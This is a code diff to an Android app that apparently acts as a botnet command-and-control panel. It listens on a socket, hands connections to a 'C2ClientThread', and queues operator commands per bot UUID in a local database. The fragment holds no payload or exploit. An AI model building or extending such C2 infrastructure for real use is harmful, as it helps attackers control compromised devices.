@@ -22,13 +22,14 @@ public class MainActivity extends AppCompatActivity {
      */
     private static final String TAG = "ServerSocketTest";
     private ServerSocket server;
+    private CommandDatabase commandDatabase;
     Runnable conn = new Runnable() {
         public void run() {
             try {
                 server = new ServerSocket(25565);
                 while (true) {
                     Socket socket = server.accept();
-                    new C2ClientThread(socket).start();
+                    new C2ClientThread(socket, commandDatabase).start();
                 }
             } catch (IOException e) {
                 Log.e(TAG, e.getMessage());
@@ -43,22 +44,27 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         new Thread(conn).start();
+        commandDatabase = new CommandDatabase(getApplicationContext());
 
         EditText command = (EditText) findViewById(R.id.command);
+        EditText uuidEditText = (EditText) findViewById(R.id.uuidEditText);
         Button getCommand = (Button) findViewById(R.id.SendCommand);
         getCommand.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 String cmd = command.getText().toString();
-                CommandDatabase commandDatabase = new CommandDatabase(getApplicationContext());
-
+                String uuid = uuidEditText.getText().toString();
                 // Create a new map of values, where column names are the keys
                 // TODO: change to get uuid and output passed in from client
-                boolean bool = commandDatabase.insertIntoDatabase("ahhhhhhhh4123", cmd, "blah");
+                commandDatabase.updateDatabase(uuid, cmd, "");
+
+                /*
                 ArrayList<String> list = commandDatabase.getFromDatabase("ahhhhhhhh4123", BotEntryContract.BotEntry.command);
                 for (String item : list) {
                     Toast.makeText(getApplicationContext(), item, Toast.LENGTH_LONG).show();
                 }
+
+                /*
                 if (bool) {
                     Toast.makeText(getApplicationContext(), "Completed successfully :D", Toast.LENGTH_LONG).show();
                 }
@@ -69,6 +75,7 @@ public class MainActivity extends AppCompatActivity {
                         Toast.makeText(getApplicationContext(), item, Toast.LENGTH_LONG).show();
                     }
                 }
+                */
             }
         });
 
